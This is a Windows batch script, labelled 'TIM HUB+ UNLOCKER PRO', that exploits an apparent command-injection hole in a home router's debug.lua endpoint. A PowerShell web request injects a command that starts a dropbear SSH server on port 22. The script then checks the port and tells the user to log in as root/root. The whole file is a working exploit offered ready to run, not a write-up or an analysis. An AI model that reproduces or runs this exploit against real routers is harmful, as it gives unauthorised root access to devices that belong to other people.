@echo off
title TIM HUB+ UNLOCKER PRO - @thecyberanas
color 0a
cls
echo ==================================================
echo         FINAL UNLOCK TOOL BY THECYBERANAS
echo ==================================================
echo.
echo [*] Bersaglio: 192.168.1.1 (Firmware 1.0.1)
echo [*] Stato: VULNERABILE RILEVATO
echo.
echo [+] Iniezione comando per apertura SSH...
echo Attendere l'invio del pacchetto exploit...
powershell -Command "$c = New-Object System.Net.WebClient; $c.DownloadString('http://192.168.1.1/debug.lua?command=dropbear%%20-p%%2022%%20-A')" > nul 2>&1
echo.
echo [+] Comando inviato. Attesa stabilizzazione (10s)...
timeout /t 10 > nul
echo.
echo [*] VERIFICA FINALE ACCESSO ROOT...
powershell -Command "Test-NetConnection 192.168.1.1 -Port 22" | findstr "TcpTestSucceeded"
echo.
echo --------------------------------------------------
echo Se vedi 'True', il router e' tuo.
echo Puoi entrare con PuTTY usando: root / root
echo --------------------------------------------------
pause
